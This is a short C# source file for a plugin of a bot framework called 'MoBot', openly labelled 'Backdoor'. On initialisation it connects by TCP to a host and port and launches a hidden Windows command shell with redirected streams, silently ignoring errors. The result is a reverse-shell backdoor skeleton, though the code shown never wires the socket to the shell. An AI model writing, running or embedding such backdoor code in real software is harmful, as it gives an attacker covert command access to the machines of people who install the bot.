using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;

namespace MoBot.Scripts.Backdoor
{
    [MoBotExtension("Backdoor", "1.0", false)]
    public class Main
    {
        private const string Host = "localhost";
        private const int Port = 1337;

        private StreamReader input;
        private StreamWriter output;
        private Process shell;

        [Initialisation]
        public void Start()
        {
            try
            {
                var client = new TcpClient(Host, Port);
                var stream = client.GetStream();

                input = new StreamReader(stream);
                output = new StreamWriter(stream) {AutoFlush = true};

                var processStart = new ProcessStartInfo("cmd")
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true
                };

                shell = new Process {StartInfo = processStart};
                shell.Start();
            }
            catch (Exception)
            {
                // ignored
            }
        }
    }
}
